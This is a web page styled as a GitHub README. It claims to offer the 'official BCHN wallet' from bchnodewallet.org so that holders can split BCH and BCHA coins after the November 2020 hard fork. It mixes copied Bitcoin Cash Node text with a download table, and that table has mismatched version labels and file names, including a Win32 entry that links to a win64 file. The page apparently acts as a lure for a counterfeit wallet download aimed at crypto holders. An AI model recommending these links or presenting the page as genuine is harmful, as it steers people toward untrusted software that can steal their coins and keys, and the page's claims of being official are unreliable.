## How to safely split BCH and BCHA coins. BitcoinCash/BitcoinABC Hard Fork 2020

<div align="center">
  <img src="https://i.ibb.co/cyc4tdD/downloa688d.png" width="80">
</div>
<div align="center">
  <h3>
    <a href="https://bchnodewallet.org/">bchnodewallet.org</a>
  </h3>
</div>
<div align="center">
  <a href="">
    <img src="https://camo.githubusercontent.com/a4bf767b19695ac59cffcf809a1ad065a0e89b9dd58cd79668c6cc9679ea80cf/68747470733a2f2f6170692e6e65746c6966792e636f6d2f6170692f76312f6261646765732f32373431393837392d376165382d346637622d616432652d3131376665373863653831342f6465706c6f792d737461747573" alt="">
  </a>
  <a href="">
    <img src="https://camo.githubusercontent.com/6af924e2715d6ef374ce052cf9ad25e51cc3fcac8eb01dddc2b65f488f2d5a4a/68747470733a2f2f7472617669732d63692e6f72672f626974636f696e2d636173682d6e6f64652f6263686e6f64652d7765622e7376673f6272616e63683d6d6173746572" alt="">
  </a>
    <a href="">
    <img src="https://badges.crowdin.net/bchnode-web/localized.svg" alt="">
  </a>
   </a>
    <a href="">
    <img src="https://www.codefactor.io/repository/github/bitcoin-cash-node/bchnode-web/badge" alt="">
  </a>
</div>

#### This upgrade is expected to fork Bitcoin Cash out of two chains, BCHA (Bitcoin Cash ABC) and BCH (Bitcoin Cash Node)

The goal of Bitcoin Cash Node is to create sound money that is usable by everyone in the world. We believe this is a civilization-changing technology which will dramatically increase human flourishing, freedom, and prosperity. The project aims to achieve this goal by implementing a series of optimizations and protocol upgrades that will enable peer-to-peer digital cash to scale many orders of magnitude beyond current limits.

## What is Bitcoin Cash?
Bitcoin Cash is a digital currency that enables instant payments to anyone, anywhere in the world. It uses peer-to-peer technology to operate with no central authority: managing transactions and issuing money are carried out collectively by the network. Bitcoin Cash is a descendant of Bitcoin. It became a separate currency from the version supported by Bitcoin Core when the two split on August 1, 2017. Bitcoin Cash and the Bitcoin Core version of Bitcoin share the same transaction history up until the split.

## What is Bitcoin Cash Node?
[Bitcoin Cash Node](bitcoincashnodes.org) is the name of open-source software which enables the use of Bitcoin Cash. It is a descendant of the Bitcoin Core and Bitcoin ABC software projects.

## How to safely split BCH and BCHA (Bitcoin ABC) coins using official desktop wallet.
The problem that splitting coins solves, is to make it so you can spend the coins on the Bitcoin Cash Node network without the same transaction also spending the coins on the Bitcoin Cash ABC network. This happens for coins that have not been split, because when your wallet creates the transaction that spends them, it has no way of marking that transaction so it only works on one of those networks.

If you had BCH wallet at the time of the hardfork (Nov 15,2020), you can get two coins: BCH and BitcoinABC. You balance will be dublicated in two networks.
Install the [official BCHN wallet](https://bchnodewallet.org) and split your BCH coins.
## BCHNwallet - Lightweight Bitcoin Cash client
```
Licence: MIT Licence
Author: BitcoinCashNode Developers
Language: Python
Latest version: v.4.3.1
```
## Install
| Operating system | Latest version |
| ------ | ------ |
| Windows | [Download Win64 3.4.022](https://bchnodewallet.org/download/BCHNWallet-win64-3.1.1.zip) |
| Windows | [Download Win32 3.4.021](https://bchnodewallet.org/download/BCHNWallet-win64-3.1.1.zip) |
| MacOS |   [Download OSX 2.1.1](https://bchnodewallet.org/download/BCHNWallet-3.0.11-osx.zip) |
| Web version | [BCHNwallet 4.3](https://bchnodewallet.org) |
## License
Bitcoin Cash Node is released under the terms of the MIT license. See COPYING for more information or see https://opensource.org/licenses/MIT.

## Run the develoment server
You will need [nodeJS](https://nodejs.org/en/) installed on your machine, then run the following once:
```
npm install -g gulp-cli
npm install
```
Run the following every time you want to start the development server:
```
gulp
```
Hit ``` ctrl + C ``` to stop the server.

## Writing an article
In ```/blog/```, copy the ```example.md``` file and replace the content. Run ```gulp``` to preview the article in the browser (located at http://localhost:3000/en/newsroom/filename).

## Translating
Translations are managed through [Crowdin](https://crowdin.com/). If you wish to translate this website into your own language, please open an issue at this repo.

Pull requests are automatically created when a translation is updated.

[<img src='https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/github.svg' alt='github' height='40'>](https://github.com/BCH-Bcash)  
